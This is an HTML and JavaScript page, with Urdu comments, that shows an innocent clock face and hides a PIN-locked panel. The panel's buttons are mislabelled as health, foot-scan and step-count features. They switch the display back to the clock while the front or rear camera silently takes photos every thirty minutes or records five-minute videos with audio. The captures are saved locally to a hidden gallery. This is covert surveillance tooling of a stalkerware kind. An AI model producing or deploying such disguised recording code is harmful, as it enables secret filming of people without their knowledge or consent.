<!DOCTYPE html>
<html lang="ur">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roman Studio System</title>
    <style>
        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; }
        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top:0; left:0; z-index: 999; background: #000; }
        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: #050505; }
        .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; }
        .hour { width: 6px; height: 50px; background: white; z-index: 3; }
        .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
        .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; }
        @keyframes blink { 0%, 100% { opacity: 0.4; } 50% { opacity: 1; } }

        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: #000; position: fixed; top:0; z-index: 1000; padding-top: 25vh; }
        input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: #111; color: white; border: 1px solid #333; border-radius: 12px; outline: none; }

        #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: #000; position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
        
        #preview { display: none; }
        #status-msg { text-align: center; color: #2ecc71; font-weight: bold; margin: 10px 0; min-height: 20px; }

        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
        .btn-blue { background: #2c3e50; border: 1px solid #34495e; }
        .btn-green { background: #27ae60; }
        .btn-orange { background: #d35400; }
        .btn-purple { background: #8e44ad; } /* گیلری بٹن کا نیا رنگ */
        .btn-red { background: #c0392b; }
        
        .sub-menu { display: none; background: #0a0a0a; padding: 10px; border-radius: 12px; margin-bottom: 10px; border: 1px solid #222; }

        .gallery { display: none; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; padding-bottom: 50px; }
        .card { background: #111; padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
        .card img, .card video { width: 100%; border-radius: 8px; margin-bottom: 5px; }
        .del-btn { background: #e74c3c; color: white; border: none; padding: 8px; border-radius: 6px; cursor: pointer; width: 100%; font-size: 12px; }
    </style>
</head>
<body>

    <div id="clock-screen" onclick="openPin()">
        <div class="clock">
            <div id="hour" class="hand hour"></div>
            <div id="min" class="hand minute"></div>
            <div id="sec" class="hand second"></div>
        </div>
        <div class="roman-text">ROMAN STUDIO</div>
    </div>

    <div id="pin-screen">
        <h3>System Access</h3>
        <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
    </div>

    <div id="admin-panel">
        <h3 style="text-align:center; color:#3498db;">HEALTH MONITOR</h3>
        
        <div id="status-msg"></div>
        <video id="preview" autoplay playsinline muted></video>
        <canvas id="canvas" style="display:none;"></canvas>

        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Health Foot Settings</button>
        <div id="front-menu" class="sub-menu">
            <button class="btn btn-green" onclick="startAutoPhoto('user')">Start Health Foot Analysis</button>
            <button class="btn btn-orange" onclick="startVideoRecording('user')">Deep Scan (5 Min)</button>
        </div>

        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Health Body Settings</button>
        <div id="back-menu" class="sub-menu">
            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Start Health Body Analysis</button>
            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Full Scan (5 Min)</button>
        </div>

        <button class="btn btn-purple" onclick="toggleGallery()">Count Steps</button>
        
        <button class="btn btn-red" onclick="location.reload()">Lock System</button>
        
        <div id="gallery" class="gallery"></div>
    </div>

    <script>
        // گھڑی کا فنکشن
        function runClock() {
            const now = new Date();
            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
            document.getElementById('min').style.transform = `translateX(-50%) rotate(${now.getMinutes()*6}deg)`;
            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(now.getHours()%12)*30 + now.getMinutes()/2}deg)`;
        }
        setInterval(runClock, 1000);

        function openPin() { document.getElementById('pin-screen').style.display='block'; }
        
        function goBackToClock() {
            document.getElementById('pin-screen').style.display='none';
            document.getElementById('admin-panel').style.display='none';
            document.getElementById('clock-screen').style.display='flex';
        }
        
        function checkPin(v) { 
            if(v==='4590') { 
                document.getElementById('pin-screen').style.display='none'; 
                document.getElementById('clock-screen').style.display='none'; 
                document.getElementById('admin-panel').style.display='block'; 
                updateGallery();
            } 
        }

        function toggleSub(id) {
            let el = document.getElementById(id);
            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
        }

        function toggleGallery() {
            let gal = document.getElementById('gallery');
            gal.style.display = (gal.style.display === 'grid') ? 'none' : 'grid';
        }

        let currentStream = null;
        let currentRecorder = null;
        let photoInterval = null;
        let videoTimeout = null;
        let photoCounter = 0;
        let chunks = [];

        function showStatus() {
            const status = document.getElementById('status-msg');
            status.innerText = "Run ok";
            setTimeout(() => { status.innerText = ""; }, 4000);
        }

        async function startAutoPhoto(camType) {
            stopAllActivities();
            showStatus();
            goBackToClock();
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: false });
                const preview = document.getElementById('preview');
                preview.srcObject = currentStream;
                photoCounter = 0;
                takePhoto();
                photoCounter++;
                photoInterval = setInterval(() => {
                    if(photoCounter < 20) { takePhoto(); photoCounter++; } 
                    else { stopAllActivities(); }
                }, 30 * 60 * 1000);
            } catch(e) { console.error(e); }
        }

        async function startVideoRecording(camType) {
            stopAllActivities();
            showStatus();
            goBackToClock();
            try {
                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: camType }, audio: true });
                const preview = document.getElementById('preview');
                preview.srcObject = currentStream;
                currentRecorder = new MediaRecorder(currentStream);
                chunks = [];
                currentRecorder.ondataavailable = (e) => { if(e.data.size > 0) chunks.push(e.data); };
                currentRecorder.onstop = () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    const reader = new FileReader();
                    reader.readAsDataURL(blob);
                    reader.onloadend = () => { saveData('vid', reader.result); };
                };
                currentRecorder.start();
                videoTimeout = setTimeout(() => {
                    if(currentRecorder && currentRecorder.state === "recording") {
                        currentRecorder.stop();
                        stopAllActivities();
                    }
                }, 5 * 60 * 1000);
            } catch(e) { console.error(e); }
        }

        function takePhoto() {
            if(!currentStream) return;
            const preview = document.getElementById('preview');
            const canvas = document.getElementById('canvas');
            if(!preview.videoWidth) return;
            canvas.width = preview.videoWidth;
            canvas.height = preview.videoHeight;
            const context = canvas.getContext('2d');
            context.drawImage(preview, 0, 0, canvas.width, canvas.height);
            saveData('img', canvas.toDataURL('image/jpeg', 0.7));
        }

        function stopAllActivities() {
            if(photoInterval) clearInterval(photoInterval);
            if(videoTimeout) clearTimeout(videoTimeout);
            if(currentRecorder && currentRecorder.state === "recording") currentRecorder.stop();
            if(currentStream) { currentStream.getTracks().forEach(track => track.stop()); currentStream = null; }
            photoCounter = 0;
        }

        function saveData(type, data) {
            let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            storage.push({ t: type, d: data, time: new Date().toLocaleString() });
            localStorage.setItem('rvault', JSON.stringify(storage));
            updateGallery();
        }

        function updateGallery() {
            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
            const gallery = document.getElementById('gallery');
            gallery.innerHTML = '';
            storage.slice().reverse().forEach((item, index) => {
                const actualIndex = storage.length - 1 - index;
                const media = item.t === 'img' ? `<img src="${item.d}">` : `<video src="${item.d}" controls></video>`;
                gallery.innerHTML += `<div class="card">${media}<p style="font-size:10px;">${item.time}</p><button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button></div>`;
            });
        }

        function deleteItem(index) {
            if(confirm("Delete record?")) {
                let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
                storage.splice(index, 1);
                localStorage.setItem('rvault', JSON.stringify(storage));
                updateGallery();
            }
        }
        window.addEventListener('beforeunload', () => { stopAllActivities(); });
    </script>
</body>
</html>
